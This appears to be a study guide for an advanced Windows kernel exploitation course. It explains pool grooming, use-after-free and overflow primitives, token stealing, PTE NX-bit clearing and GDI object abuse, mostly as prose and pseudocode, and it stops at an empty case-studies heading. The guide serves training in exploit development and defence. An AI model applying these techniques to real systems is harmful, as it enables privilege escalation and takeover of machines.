# EXP-401 / AWE Technical Depth: Advanced Windows Exploitation for OSEE

## Table of Contents

1. [Course Overview](#1-course-overview)
2. [Exploitation Techniques](#2-exploitation-techniques)
   - [Type Confusion Exploitation](#21-type-confusion-exploitation)
   - [Use-After-Free Exploitation](#22-use-after-free-exploitation)
   - [Pool Overflow and Corruption](#23-pool-overflow-and-corruption)
   - [Integer Overflow Exploitation](#24-integer-overflow-exploitation)
   - [Race Conditions](#25-race-conditions)
   - [Object-Oriented Exploitation Primitives](#26-object-oriented-exploitation-primitives)
3. [Windows Internals Knowledge](#3-windows-internals-knowledge)
   - [Memory Management](#31-memory-management)
   - [Token Manipulation and Privilege Escalation](#32-token-manipulation-and-privilege-escalation)
   - [Win32k Subsystem and GDI Objects](#33-win32k-subsystem-and-gdi-objects)
   - [I/O Manager and IRP Handling](#34-io-manager-and-irp-handling)
   - [Object Manager Internals](#35-object-manager-internals)
4. [Real-World Case Studies and CVEs](#4-real-world-case-studies-and-cves)
5. [Tools of the Trade](#5-tools-of-the-trade)
6. [Shellcoding Techniques](#6-shellcoding-techniques)
7. [Mitigation Bypass Techniques](#7-mitigation-bypass-techniques)
8. [Bridging Theory and Real-World Exploitation](#8-bridging-theory-and-real-world-exploitation)
9. [Exam Structure and Expectations](#9-exam-structure-and-expectations)
10. [References and Further Reading](#10-references-and-further-reading)

---

## 1. Course Overview

EXP-401: Advanced Windows Exploitation (AWE) is OffSec's most technically demanding course, designed for experienced exploit developers seeking the Offensive Security Exploitation Expert (OSEE) certification. The course is exclusively delivered in-person over five intensive days due to the significant learner-instructor interaction required for material at this depth.

### Positioning in the OffSec Curriculum

EXP-401 sits at the 400 level -- above EXP-301 (OSED) which covers user-mode exploit development. Where EXP-301 teaches DEP bypass via ROP, SEH exploitation, and custom shellcode on user-mode applications, EXP-401 escalates into:

- **64-bit kernel-mode exploitation** against production Windows targets
- **Complex heap manipulations** involving the Windows kernel pool (segment heap era)
- **Security mitigation bypass** against modern defenses (SMEP, SMAP, kCFG, kASLR, ACG, CET)
- **Disarming Windows Defender Exploit Guard (WDEG)** mitigations
- **Version-independent exploitation** techniques that survive across Windows builds

### Prerequisites

Students are expected to arrive with:

- Proficiency in x86_64 assembly language
- Experience operating WinDbg and IDA Pro
- Foundational C/C++ programming ability
- Prior exploit development experience (OSED-level or equivalent)
- Understanding of Windows kernel architecture fundamentals

### Lab Environment

- Host OS: Windows 10 (required)
- VMware Workstation 15+
- Minimum 4-core 64-bit CPU with NX, SMEP, VT-d/IOMMU, VT-x/EPT support
- 16 GB RAM minimum, 160 GB free disk space
- Ability to run three VMs simultaneously
- Course materials distributed via USB in-class; no online content

---

## 2. Exploitation Techniques

### 2.1 Type Confusion Exploitation

Type confusion vulnerabilities occur when a program allocates or manipulates an object as one type but subsequently uses it as a different, incompatible type. In the context of EXP-401, this class of vulnerability is critical in both user-mode (particularly browser engines and COM objects) and kernel-mode (particularly the Win32k subsystem) exploitation.

#### Technical Mechanics

A type confusion arises when:

1. A function receives an object pointer without proper type validation
2. A virtual function table (vtable) is accessed using incorrect type assumptions
3. A union or variant type is interpreted using the wrong discriminator
4. An object is cast to a parent/sibling class that has a different memory layout

In the Windows kernel, type confusion often manifests in the Win32k subsystem where GDI and USER objects are managed through handle tables with type-tagged entries. When the kernel misidentifies an object type, it may:

- Access memory at incorrect offsets within the object
- Call function pointers from the wrong vtable
- Interpret data fields as pointers (or vice versa)

#### Exploitation Pattern

```
1. Trigger the type confusion:
   - Create Object A of TypeX
   - Through a bug, cause the kernel to treat Object A as TypeY
   - TypeY has a function pointer at offset 0x18 where TypeX has user-controlled data

2. Achieve code execution:
   - Place a controlled value at the offset the kernel expects a function pointer
   - Trigger the kernel to invoke the "function pointer" on the confused object
   - Redirect execution to attacker-controlled code or a ROP chain

3. Alternatively, achieve an arbitrary read/write:
   - TypeY has a pointer field at offset 0x20 where TypeX has a length field
   - Control the "length" to read/write out of bounds
```

#### Kernel-Specific Considerations

In Windows kernel type confusion exploitation:

- Objects in the Win32k handle table are indexed by type; corrupting the type byte or misusing an unvalidated type parameter can trigger confusion
- `tagWND`, `tagMENU`, and `tagCLIPDATA` objects have historically been targets because of their complex inheritance hierarchies and type-dependent field layouts
- Modern mitigations like Kernel Control Flow Guard (kCFG) make vtable hijacking more difficult, requiring creative approaches to bypass indirect call validation

#### Real-World Example: CVE-2015-2546

This Win32k type confusion involved the `xxxMNOpenHierarchy` function mishandling menu objects. The kernel treated a user-controlled object as a `tagMENU` structure, allowing an attacker to place a crafted vtable pointer and redirect execution to shellcode. This class of bug has been the basis for numerous Win32k elevation-of-privilege exploits studied in AWE.

### 2.2 Use-After-Free Exploitation

Use-after-free (UAF) vulnerabilities represent one of the most powerful and prevalent bug classes in both user-mode and kernel-mode Windows exploitation. In EXP-401, UAF exploitation is taught in the context of kernel pool manipulation, where freed objects are reallocated with attacker-controlled data.

#### Technical Mechanics

The UAF lifecycle:

```
Phase 1: Allocation
  Object *obj = ExAllocatePoolWithTag(NonPagedPoolNx, sizeof(OBJECT), 'Tag1');
  obj->Callback = LegitimateFunction;

Phase 2: Premature Free
  ExFreePoolWithTag(obj, 'Tag1');
  // obj pointer is not nullified -- becomes a "dangling pointer"

Phase 3: Reallocation (Attacker-Controlled)
  // Spray objects of the same size into the same pool
  // One of these allocations will reuse the freed memory
  FakeObj = ExAllocatePoolWithTag(NonPagedPoolNx, sizeof(OBJECT), 'Fake');
  FakeObj->Callback = MaliciousFunction;

Phase 4: Use of Dangling Pointer
  obj->Callback();  // Calls MaliciousFunction instead of LegitimateFunction
```

#### kLFH and UAF Exploitation

The kernel Low Fragmentation Heap (kLFH), introduced with the segment heap in Windows 10 19H1, has significant implications for UAF exploitation:

- **Bucket-based allocation**: The kLFH uses predetermined size buckets (1-16 bytes, 17-31 bytes, etc. up to 16,368 bytes). Freed slots within a bucket remain available only for allocations of the same bucket size.
- **No coalescing**: Unlike the legacy pool allocator, the kLFH does not combine adjacent free chunks. A freed slot in a bucket remains the same size, which means it can only be filled by an allocation of the same bucket size.
- **Deterministic reuse**: After 16 consecutive allocations to the same bucket, the kLFH is activated. Freed slots are reused by subsequent allocations to the same bucket, providing a reliable primitive for UAF exploitation.
- **Pool tag independence**: Crucially, the kLFH does not distinguish between pool tags when placing allocations into buckets. Any allocation of the right size on the right pool type will be placed in the same bucket.

#### Exploitation Strategy

```
1. Identify the size and pool type of the vulnerable (freed) object
2. Determine the kLFH bucket:
   - Buckets 1-64: 16-byte granularity (sizes 1-1024)
   - Buckets 65-128: 64-byte granularity (sizes 1025-4096)
   - Bucket 129: 512-byte granularity (sizes 4097-16368)
3. Activate the kLFH for that bucket: perform 16+ consecutive allocations
4. Spray replacement objects:
   - Must be same size (same kLFH bucket)
   - Must be same pool type (PagedPool, NonPagedPoolNx, etc.)
   - Must contain controllable data at the offset of interest
5. Trigger the dangling pointer use
6. Convert to code execution or arbitrary read/write
```

#### Example: HEVD UseAfterFreeNonPagedPoolNx

The HackSys Extreme Vulnerable Driver (HEVD) provides a pedagogical example used in training contexts:

- A `USE_AFTER_FREE_NON_PAGED_POOL_NX` structure is allocated with a `Callback` function pointer member
- The object can be freed via one IOCTL while retaining the dangling pointer
- Another IOCTL triggers the `Callback` member
- The attacker sprays the pool with same-size objects containing a controlled function pointer
- Upon triggering the callback, execution is redirected to attacker-controlled code

### 2.3 Pool Overflow and Corruption

Pool-based buffer overflow exploitation is one of the centerpieces of EXP-401. The course covers both legacy pool exploitation (Windows 7 era) and modern segment-heap-era exploitation (Windows 10 19H1+).

#### Evolution of the Windows Pool

| Era | Allocator | Header | Key Characteristics |
|-----|-----------|--------|---------------------|
| Windows 7 | Legacy pool | `_POOL_HEADER` (unencoded) | Lookaside lists, coalescing, predictable layout |
| Windows 8/8.1 | Legacy pool + hardening | `_POOL_HEADER` (partial encoding) | Safe unlinking, pool cookie validation |
| Windows 10 pre-19H1 | Legacy pool + further hardening | `_POOL_HEADER` | Reduced attack surface, randomized pool layout |
| Windows 10 19H1+ | Segment heap | `_POOL_HEADER` (kLFH) / `_HEAP_VS_CHUNK_HEADER` (VS) | kLFH, VS, Segment Alloc, Large Alloc; VS headers encoded |

#### Segment Heap Architecture

The segment heap divides kernel pool allocations into four backend allocators:

1. **Low Fragmentation Heap (kLFH)**: Services allocations from 1 to 16,368 bytes after 16 consecutive same-size allocations activate it. Uses 129 buckets with various granularities. Chunks are still prepended with the classic `_POOL_HEADER` (unencoded).

2. **Variable Size (VS)**: Handles allocations that don't qualify for kLFH. Uses `_HEAP_VS_CHUNK_HEADER` with encoded members, making header corruption significantly harder.

3. **Segment Alloc**: Handles larger allocations.

4. **Large Alloc**: Services the largest allocations, typically using entire pages.

Each pool is managed by a `_SEGMENT_HEAP` structure:

```
kd> dt nt!_SEGMENT_HEAP
   +0x000 EnvHandle        : _RTL_HP_ENV_HANDLE
   +0x010 Signature        : Uint4B
   +0x014 GlobalFlags      : Uint4B
   +0x018 Interceptor      : Uint4B
   +0x01c ProcessHeapListIndex : Uint2B
   +0x01e AllocatedFromMetadata : Pos 0, 1 Bit
   +0x020 CommitLimitData  : _RTL_HEAP_MEMORY_LIMIT_DATA
   ...
   +0x080 LargeAllocMetadata : _RTL_RB_TREE
   +0x090 LargeReservedPages : _RTL_SPARSE_ARRAY
   +0x0c8 LfhContext       : _HEAP_LFH_CONTEXT
```

#### Pool Overflow Exploitation in the kLFH Era

The kLFH fundamentally changes pool overflow exploitation:

**Constraint 1: Same-size adjacency**
In the kLFH, all chunks in a bucket are the same size. An overflow from one chunk will always corrupt a chunk of the exact same size in the same bucket. This severely limits which objects can serve as corruption targets.

**Constraint 2: Pool header preservation**
Each kLFH chunk is prepended with `_POOL_HEADER` (0x10 bytes on x64). Corrupting this header will cause a BSOD when the chunk is freed. The exploit must either:
- Reconstruct the header with correct values (kLFH headers are unencoded, so hardcoding is possible)
- Avoid freeing the corrupted chunk

**Constraint 3: Same pool type**
The overflow target must be allocated on the same pool type (PagedPool, NonPagedPoolNx, etc.) as the vulnerable buffer.

**Constraint 4: kLFH activation**
The kLFH is not immediately active for a given bucket. It requires 16 consecutive allocations to the same bucket before activating. The exploit must account for this heuristic.

#### Exploitation Methodology

```
Step 1: Identify the vulnerable allocation
  - Determine size, pool type, and pool tag
  - Calculate which kLFH bucket it falls into

Step 2: Find a suitable target object
  - Same kLFH bucket (same size range)
  - Same pool type
  - Contains an exploitable member (function pointer, data pointer, length field)
  - Allocatable from user mode (via syscall, CreateEvent, IoControl, etc.)

Step 3: Pool grooming
  a. Spray objects to activate kLFH and fill existing free slots
  b. Allocate a new page worth of controlled objects
  c. Free every other object to create alternating holes
  d. Trigger the vulnerable allocation to fill holes
  e. Desired layout: VULN | TARGET | VULN | TARGET | ...

Step 4: Trigger the overflow
  - Overflow past the vulnerable chunk boundary
  - Overwrite the _POOL_HEADER of the adjacent target with a hardcoded valid header
  - Overwrite the target object's exploitable member (e.g., Name pointer, Callback)

Step 5: Convert to primitive
  - Use the corrupted member to establish an arbitrary read/write
  - Or redirect execution via corrupted function pointer
```

#### Practical Example: Pool Overflow to Arbitrary Read/Write

The following pattern, demonstrated using HEVD, shows how a pool overflow can be chained into a full arbitrary read/write primitive:

1. Create a "main" `ARW_HELPER_OBJECT` with known address
2. Groom the pool with thousands of `ARW_HELPER_OBJECT` structures (0x20 bytes each, including header), filling their `Name` pointers with sentinel values (e.g., 0x9090909090909090)
3. Free every other object, creating holes
4. Trigger the pool overflow IOCTL, which allocates a 16-byte chunk and copies a user-controlled buffer of arbitrary size into it
5. The overflow corrupts the adjacent `ARW_HELPER_OBJECT`, specifically overwriting its `Name` pointer with the address of the "main" object
6. Scan all groomed objects to find which one has a non-sentinel `Name` value (identifying the corrupted object)
7. Use the "Set" operation on the corrupted object to write to the main object's `Name` pointer (arbitrary write target setup)
8. Use the "Get" operation on the main object to dereference and read from any address (arbitrary read)
9. Use the "Set" operation on the main object to write to any address (arbitrary write)

This two-object technique is powerful because after the initial overflow, all subsequent read/write operations are performed through the IOCTL interface without additional corruption.

### 2.4 Integer Overflow Exploitation

Integer overflows in the Windows kernel can lead to undersized buffer allocations, which are subsequently treated as larger buffers, creating exploitable overflow conditions.

#### Common Patterns

**Allocation size truncation:**
```c
// Vulnerable: SIZE_T is 64-bit, but if Length is attacker-controlled
// and the addition wraps around, a small buffer is allocated
SIZE_T allocationSize = HeaderSize + Length;  // Integer overflow here
PVOID buffer = ExAllocatePoolWithTag(NonPagedPoolNx, allocationSize, 'Tag1');
// Copy operation uses original Length, which is much larger than allocationSize
RtlCopyMemory(buffer, userInput, Length);
```

**Multiplication overflow:**
```c
ULONG count = UserSuppliedCount;     // e.g., 0x40000001
ULONG elementSize = sizeof(ELEMENT); // e.g., 0x10
ULONG totalSize = count * elementSize; // Wraps to 0x10
PVOID array = ExAllocatePoolWithTag(NonPagedPoolNx, totalSize, 'Tag1');
// Loop writes count * elementSize bytes, massively overflowing
```

**Signed/unsigned confusion:**
```c
// Size parameter accepted as signed int
int size = UserSuppliedSize;  // Could be negative
if (size > MAX_SIZE) return STATUS_INVALID_PARAMETER;
// Negative value passes the check
ExAllocatePoolWithTag(NonPagedPoolNx, (SIZE_T)size, 'Tag1');
// Negative int cast to SIZE_T becomes a massive positive value
```

#### Exploitation Strategy

1. **Identify the arithmetic operation** that leads to a truncated or wrapped allocation size
2. **Calculate input values** that produce the desired (small) allocation while the copy operation uses the original (large) size
3. **Apply pool grooming techniques** identical to the pool overflow case (the integer overflow converts to a pool overflow)
4. **Trigger the vulnerability** and proceed with pool corruption

#### Mitigations and Bypasses

- `ExAllocatePool2` (Windows 10 2004+) initializes allocations to zero but does not prevent integer overflow in size calculations
- `RtlSizeTMult` and `RtlSizeTAdd` are safe arithmetic functions available in the kernel, but many drivers fail to use them
- The course teaches how to identify these patterns through static analysis in IDA Pro

### 2.5 Race Conditions

Race conditions in kernel-mode exploitation occur when two or more threads can access shared state concurrently without proper synchronization, creating a Time-of-Check-to-Time-of-Use (TOCTOU) window that can be exploited.

#### TOCTOU in Kernel Drivers

A classic kernel race condition pattern:

```c
// Thread 1 (normal execution path):
ProbeForRead(UserBuffer, Size, sizeof(UCHAR));  // Check: is buffer in user mode?
// <-- RACE WINDOW: another thread can remap UserBuffer to kernel memory
RtlCopyMemory(KernelDest, UserBuffer, Size);    // Use: copy from (now kernel) buffer
```

Between the `ProbeForRead` check and the `RtlCopyMemory` use, a second thread can:

1. Unmap the user-mode page backing `UserBuffer`
2. Remap the virtual address to point to kernel memory
3. The copy operation now reads from kernel memory, creating an information disclosure

#### Double-Fetch Vulnerabilities

```c
// First fetch: read size from shared memory
ULONG size = *(PULONG)SharedUserAddress;
if (size > MAX_ALLOWED_SIZE) return STATUS_INVALID_PARAMETER;

// Second fetch: read size again (implicitly, during copy)
// Another thread may have changed the value between the two reads
RtlCopyMemory(kernelBuffer, SharedUserAddress, *(PULONG)SharedUserAddress);
```

The second dereference of `SharedUserAddress` may return a different (larger) value, causing a buffer overflow.

#### Kernel Object Race Conditions

More sophisticated race conditions involve kernel object lifecycle management:

- **Handle table races**: Closing a handle while another thread is using the referenced object
- **Reference count races**: Decrementing an object's reference count while another thread holds a pointer
- **Lock ordering violations**: Acquiring locks in inconsistent orders, leading to deadlocks or state corruption

#### Exploitation Techniques

1. **Thread spraying**: Create many threads that repeatedly trigger the race to increase the probability of winning the race window
2. **CPU affinity manipulation**: Pin threads to specific cores to control scheduling
3. **NtAlertResumeThread / NtSuspendThread**: Precisely control thread execution timing
4. **WorkerFactory objects**: Create kernel-mode worker threads for fast concurrent operations
5. **Priority manipulation**: Adjust thread priorities to influence scheduling decisions
6. **Large buffer operations**: Use large memory operations to widen the race window

#### Practical Considerations

Race conditions in kernel exploitation are inherently probabilistic. The course teaches:

- How to calculate and maximize win rates
- How to detect success/failure without crashing the system
- How to make exploits reliable across different hardware (single-core vs. multi-core, varying CPU speeds)
- How to handle failed race attempts gracefully (without BSODs)

### 2.6 Object-Oriented Exploitation Primitives

Modern Windows kernel exploitation is built on the concept of converting a vulnerability into abstract exploitation primitives, then chaining those primitives to achieve code execution or data-only attacks.

#### The Primitive Hierarchy

```
Vulnerability (bug)
    |
    v
Corruption Primitive (what can be directly corrupted)
    |
    v
Abstract Primitives:
    +-- Arbitrary Read (read any kernel address)
    +-- Arbitrary Write (write to any kernel address)
    +-- Arbitrary Decrement/Increment
    +-- Controlled Execution (redirect code flow)
    |
    v
Exploitation Goals:
    +-- Token Stealing (privilege escalation)
    +-- Page Table Entry Corruption (DEP bypass)
    +-- Shellcode Execution
    +-- Data-Only Attacks
```

#### Read Primitives

An arbitrary read primitive allows reading the contents of any kernel virtual address. Construction methods include:

- **Pool overflow + object member corruption**: Overwrite a pointer member in an adjacent pool object, then read it back through a legitimate driver interface (as shown in the pool overflow section)
- **Out-of-bounds read**: A vulnerability that allows reading past an allocated buffer, disclosing adjacent pool contents including kernel pointers
- **Corrupted object field dereference**: Modify an object's pointer field so that a legitimate kernel read operation dereferences an attacker-controlled address

Common uses of read primitives:
- **kASLR bypass**: Leak kernel base addresses from pool metadata, vtable pointers, or function pointers
- **Token address leakage**: Read process token addresses for subsequent token manipulation
- **PTE base leakage**: Read `MiGetPteAddress+0x13` to obtain the PTE base for page table manipulation
- **Canary/cookie leakage**: Read pool cookies or stack canaries to reconstruct corrupted headers

#### Write Primitives

An arbitrary write primitive allows writing attacker-controlled data to any kernel virtual address. Construction methods include:

- **Pool overflow + two-object technique**: Use one corrupted object to set write targets, and another to perform the actual write through a legitimate interface
- **Corrupted length field**: Modify an object's length field to enable out-of-bounds writes through a legitimate copy operation
- **Write-What-Where via driver IOCTL**: Some drivers expose IOCTL interfaces that can be abused for arbitrary writes when input validation is bypassed

Common uses of write primitives:
- **Token privilege manipulation**: Overwrite `_TOKEN.Privileges.Enabled` to grant `SeDebugPrivilege` or set all privileges
- **PTE bit flipping**: Modify page table entries to make non-executable pages executable (bypass DEP/SMEP)
- **HalDispatchTable overwrite**: Write a shellcode address to `nt!HalDispatchTable+0x8` and trigger via `NtQueryIntervalProfile`
- **KUSER_SHARED_DATA shellcode staging**: Write shellcode to `KUSER_SHARED_DATA+0x800` (0xFFFFF78000000800), a writable region at a known address, then flip its PTE to executable

#### Execute Primitives

An execute primitive allows redirecting kernel execution to attacker-controlled code:

- **Direct function pointer overwrite**: Overwrite a function pointer in a known kernel structure (HalDispatchTable, GDI object callbacks)
- **PTE corruption + shellcode**: Mark a page containing shellcode as executable, then trigger its execution
- **Return-oriented programming (ROP)**: Chain existing kernel gadgets to perform operations without injecting code (useful when HVCI is enabled)

#### Data-Only Attacks (Post-HVCI)

With HVCI and VBS becoming default on Windows 11, the course increasingly emphasizes data-only attacks that do not require code execution:

- **Token stealing**: Copy the SYSTEM process token to the current process
- **Privilege bit manipulation**: Directly modify privilege fields in the token structure
- **Security descriptor modification**: Alter object security descriptors to bypass access checks
- **Job object manipulation**: Modify job objects to escape sandboxes

---

## 3. Windows Internals Knowledge

### 3.1 Memory Management

#### Pool Architecture

The Windows kernel exposes `ExAllocatePoolWithTag` (deprecated) and `ExAllocatePool2` (Windows 10 2004+) for dynamic kernel memory allocation. All pool allocations come from one of several pools:

- **NonPagedPool / NonPagedPoolNx**: Memory that is always resident in physical memory. NonPagedPoolNx has NX (No-Execute) protection.
- **PagedPool**: Memory that can be paged out to disk. Cannot be accessed at DISPATCH_LEVEL or above.
- **Session Pool**: Used by the Win32k subsystem for per-session allocations.

The `_POOL_HEADER` structure (0x10 bytes on x64):

```
kd> dt nt!_POOL_HEADER
   +0x000 PreviousSize     : Pos 0, 8 Bits
   +0x000 PoolIndex        : Pos 8, 8 Bits
   +0x000 BlockSize        : Pos 16, 8 Bits
   +0x000 PoolType         : Pos 24, 8 Bits
   +0x004 PoolTag          : Uint4B
   +0x008 ProcessBilled    : Ptr64 _EPROCESS
   +0x008 AllocatorBackTraceIndex : Uint2B
   +0x00a PoolTagHash      : Uint2B
```

Key exploitation notes:
- The `ProcessBilled` field (at offset 0x8) stores an XOR-encoded `_EPROCESS` pointer when `PoolQuota` is set in `PoolType`. Reconstructing this requires leaking the pool cookie.
- When `PoolQuota` is not set, `AllocatorBackTraceIndex` and `PoolTagHash` occupy the same offset as a union.
- Invalid `_POOL_HEADER` values cause a `BAD_POOL_HEADER` (0x19) bugcheck when the chunk is freed.

#### Low Fragmentation Heap (kLFH)

The kLFH is the primary allocator for small-to-medium allocations (1 to 16,368 bytes) in the segment heap:

- **Activation heuristic**: 16 consecutive allocations to the same size bucket
- **129 buckets**: Different granularities per range (16-byte for small, up to 512-byte for large)
- **No coalescing**: Free chunks are not merged, preserving bucket integrity
- **`_POOL_HEADER` preserved**: kLFH chunks still use the classic, unencoded pool header
- **Deterministic reuse**: Freed slots are available for same-bucket allocations

Bucket layout:

| Bucket Range | Granularity | Allocation Size Range |
|-------------|-------------|----------------------|
| 1 - 64 | 16 bytes | 1 - 1,024 bytes |
| 65 - 128 | 64 bytes | 1,025 - 4,096 bytes |
| 129 | 512 bytes | 4,097 - 16,368 bytes |

#### Variable Size (VS) Segment

The VS allocator handles allocations that do not qualify for kLFH:

- Uses `_HEAP_VS_CHUNK_HEADER` instead of `_POOL_HEADER`
- Header members are **encoded** (XOR with heap-specific values), making header reconstruction significantly harder
- Supports coalescing of adjacent free chunks
- More complex exploitation compared to kLFH

#### Page Table Entries (PTEs) and Memory Paging

Understanding virtual-to-physical address translation is essential for PTE corruption techniques:

```
Virtual Address (48-bit, 4-level paging):
  [PML4 Index (9 bits)] [PDPT Index (9 bits)] [PD Index (9 bits)] [PT Index (9 bits)] [Offset (12 bits)]

PTE Format (64-bit):
  Bit 0:  Present (P)
  Bit 1:  Read/Write (R/W)
  Bit 2:  User/Supervisor (U/S)
  Bit 3:  Page-level Write-Through (PWT)
  Bit 4:  Page-level Cache Disable (PCD)
  Bit 5:  Accessed (A)
  Bit 6:  Dirty (D)
  Bit 7:  Page Size (PS) -- for large pages
  Bit 63: Execute Disable (NX/XD)
```

PTE corruption technique:
1. Read `nt!MiGetPteAddress+0x13` to leak the PTE base address (randomized per-boot since RS2)
2. Calculate the PTE virtual address for the target page: `PTE_VA = PTE_BASE + (VA >> 12) * 8`
3. Read the current PTE bits
4. Clear the NX bit (bit 63) to make the page executable
5. Write the modified PTE back
6. Execute shellcode from the now-executable page

### 3.2 Token Manipulation and Privilege Escalation

The `_TOKEN` structure is the cornerstone of Windows access control. Exploiting token manipulation is the primary goal of kernel exploits targeting privilege escalation.

#### Token Structure (Key Members)

```
kd> dt nt!_TOKEN
   +0x000 TokenSource      : _TOKEN_SOURCE
   +0x010 TokenId          : _LUID
   +0x018 AuthenticationId : _LUID
   +0x020 ParentTokenId    : _LUID
   +0x028 ExpirationTime   : _LARGE_INTEGER
   +0x030 TokenLock        : Ptr64 _ERESOURCE
   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
   +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
   +0x078 SessionId        : Uint4B
   +0x07c UserAndGroupCount : Uint4B
   +0x080 RestrictedSidCount : Uint4B
   +0x088 VariableLength   : Uint4B
   +0x0d0 IntegrityLevelIndex : Uint4B
   ...
```

#### Token Stealing

The classic privilege escalation technique:

```
1. Find the current process _EPROCESS:
   - Read gs:[0x188] to get _KTHREAD (current thread)
   - Read _KTHREAD.ApcState.Process to get _EPROCESS

2. Walk the ActiveProcessLinks (doubly-linked list) to find SYSTEM process (PID 4):
   - _EPROCESS.ActiveProcessLinks.Flink/Blink
   - _EPROCESS.UniqueProcessId == 4

3. Copy the SYSTEM token to the current process:
   - Read _EPROCESS.Token from the SYSTEM process
   - Write it to the current _EPROCESS.Token

4. Note: Token pointer is stored with reference counting bits in the low 4 bits
   - Mask with 0xFFFFFFFFFFFFFFF0 before comparison
   - Preserve the reference count bits when copying
```

#### _SEP_TOKEN_PRIVILEGES Manipulation

```
dt nt!_SEP_TOKEN_PRIVILEGES
   +0x000 Present          : Uint8B
   +0x008 Enabled          : Uint8B
   +0x010 EnabledByDefault : Uint8B
```

Setting all privileges enabled:
```
Write 0xFFFFFFFFFFFFFFFF to _TOKEN.Privileges.Present
Write 0xFFFFFFFFFFFFFFFF to _TOKEN.Privileges.Enabled
Write 0xFFFFFFFFFFFFFFFF to _TOKEN.Privileges.EnabledByDefault
```

This grants the process all possible privileges, including `SeDebugPrivilege`, `SeLoadDriverPrivilege`, `SeTcbPrivilege`, etc.

### 3.3 Win32k Subsystem and GDI Objects

The Win32k subsystem (`win32k.sys`, `win32kbase.sys`, `win32kfull.sys`) handles the graphical subsystem and window management in the kernel. It is historically the most exploited Windows kernel component.

#### Why Win32k is a Prime Target

- Extremely large and complex codebase (millions of lines)
- Handles untrusted user input (window messages, GDI operations)
- Runs in kernel mode but is directly reachable from user mode via syscalls
- Contains numerous legacy code paths dating back to Windows NT 3.1
- Manages complex object hierarchies with intricate lifetime management

#### GDI Object Exploitation

GDI objects (bitmaps, palettes, device contexts) have historically provided powerful exploitation primitives:

**Bitmap Abuse (pre-RS3):**
```
1. Create a large bitmap via CreateBitmap()
2. The kernel allocates a SURFOBJ structure on the paged pool session pool
3. The SURFOBJ contains a pvScan0 pointer to the pixel data buffer
4. Corrupt pvScan0 to point to an arbitrary kernel address
5. Use SetBitmapBits/GetBitmapBits to read/write arbitrary kernel memory
```

**Palette Abuse:**
```
1. Create a palette via CreatePalette()
2. The kernel allocates a PALETTE object
3. The PALETTE contains a pFirstColor pointer
4. Corrupt pFirstColor to point to an arbitrary address
5. Use SetPaletteEntries/GetPaletteEntries for arbitrary read/write
```

**Post-RS3 Mitigations:**
- GDI object kernel addresses are no longer leaked to user mode via the GDI shared handle table
- `pvScan0` is validated before use
- Type isolation separates GDI objects into dedicated pools

#### Handle Table and Object Lookup

Win32k objects are managed through per-session handle tables:

```
User Handle Table:
  Handle -> [Type Tag | Object Pointer | Owner Info]

Object Types: Window (tagWND), Menu (tagMENU), Hook (tagHOOK), etc.
```

Type confusion attacks often target the handle lookup mechanism, causing the kernel to retrieve an object of one type and process it as another.

### 3.4 I/O Manager and IRP Handling

Understanding the I/O Manager is critical for exploiting kernel drivers through IOCTL interfaces.

#### IRP (I/O Request Packet) Flow

```
User Mode:
  DeviceIoControl(hDevice, dwIoControlCode, lpInBuffer, nInBufferSize,
                  lpOutBuffer, nOutBufferSize, lpBytesReturned, lpOverlapped)
      |
      v
Kernel Mode:
  I/O Manager creates IRP + IO_STACK_LOCATION
      |
      v
  Driver's Dispatch Routine (IRP_MJ_DEVICE_CONTROL)
      |
      v
  IOCTL Handler parses IoControlCode, InputBuffer, OutputBuffer
      |
      v
  Driver processes request and completes IRP
```

#### I/O Transfer Types

| Method | Input Buffer | Output Buffer | Security Implications |
|--------|-------------|---------------|----------------------|
| METHOD_BUFFERED | SystemBuffer (kernel copy) | SystemBuffer (kernel copy) | Safest; kernel copies to/from user buffers |
| METHOD_IN_DIRECT | SystemBuffer | MDL-locked user buffer | Output buffer is directly mapped |
| METHOD_OUT_DIRECT | SystemBuffer | MDL-locked user buffer | Output buffer is directly mapped |
| METHOD_NEITHER | UserBuffer (raw pointer) | IRP->UserBuffer (raw pointer) | Most dangerous; direct user-mode pointers |

METHOD_NEITHER is the most commonly exploited because:
- The driver receives raw user-mode pointers
- The driver must manually validate these pointers with `ProbeForRead`/`ProbeForWrite`
- Missing or incorrect validation leads to arbitrary read/write in kernel mode
- TOCTOU races are possible between probe and use

#### IO_STACK_LOCATION Structure

```
kd> dt nt!_IO_STACK_LOCATION
   +0x000 MajorFunction    : UChar
   +0x001 MinorFunction    : UChar
   +0x008 Parameters       : <union>
       +0x000 DeviceIoControl
           +0x000 OutputBufferLength : Uint4B
           +0x008 InputBufferLength : Uint4B  -- ULONG_PTR
           +0x010 IoControlCode    : Uint4B
           +0x018 Type3InputBuffer : Ptr64 Void
```

For METHOD_NEITHER:
- `Parameters.DeviceIoControl.Type3InputBuffer` contains the raw user-mode input pointer
- `Irp->UserBuffer` contains the raw user-mode output pointer
- Both must be validated by the driver before use

### 3.5 Object Manager Internals

The Windows Object Manager provides a unified namespace and reference counting mechanism for kernel objects.

#### Object Header Structure

Every kernel object is preceded by an `_OBJECT_HEADER`:

```
kd> dt nt!_OBJECT_HEADER
   +0x000 PointerCount     : Int8B
   +0x008 HandleCount      : Int8B
   +0x008 NextToFree       : Ptr64 Void
   +0x010 Lock             : _EX_PUSH_LOCK
   +0x018 TypeIndex        : UChar      // Encoded type index
   +0x019 TraceFlags       : UChar
   +0x01a InfoMask         : UChar
   +0x01b Flags            : UChar
   +0x020 ObjectCreateInfo : Ptr64 _OBJECT_CREATE_INFORMATION
   +0x020 QuotaBlockCharged : Ptr64 Void
   +0x028 SecurityDescriptor : Ptr64 Void
   +0x030 Body             : _QUAD      // Actual object starts here
```

#### Type Index Encoding

Since Windows 10 RS2, the `TypeIndex` in `_OBJECT_HEADER` is encoded:

```
Encoded TypeIndex = OriginalTypeIndex ^ (SecondByte of Object Header Address) ^ nt!ObHeaderCookie
```

This prevents direct type confusion via `TypeIndex` manipulation without first leaking `ObHeaderCookie`.

#### Exploitation Relevance

- **Reference count manipulation**: Incrementing/decrementing `PointerCount` or `HandleCount` can create UAF conditions or prevent object destruction
- **Type confusion via TypeIndex**: If `ObHeaderCookie` is leaked, the `TypeIndex` can be corrupted to cause type confusion
- **Security descriptor corruption**: Modifying `SecurityDescriptor` can bypass access checks
- **Object namespace poisoning**: Creating objects with specific names in the object directory can influence driver behavior

---

## 4. Real-World Case Studies and CVEs

